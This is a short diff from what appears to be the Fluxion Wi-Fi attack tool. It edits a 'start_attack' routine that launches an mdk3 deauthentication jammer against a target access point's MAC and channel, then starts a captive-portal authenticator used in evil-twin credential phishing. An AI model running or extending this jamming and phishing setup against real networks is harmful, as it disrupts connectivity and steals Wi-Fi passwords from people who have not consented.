@@ -842,7 +842,7 @@ function start_attack() {
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
     echo -e "$APTargetMAC" > "$FLUXIONWorkspacePath/mdk3_blacklist.lst"
-    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "FLUXION AP Jammer [mdk3]  $APTargetSSID" -e mdk3 $WIMonitor d -b "$FLUXIONWorkspacePath/mdk3_blacklist.lst" -c $APTargetChannel &
+    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "FLUXION AP Jammer [mdk3]  $APTargetSSID" -e "mdk3 $WIMonitor d -c $APTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
     xterm -hold $TOPRIGHT -bg "#000000" -fg "#CCCCCC" -title "FLUXION AP Authenticator" -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
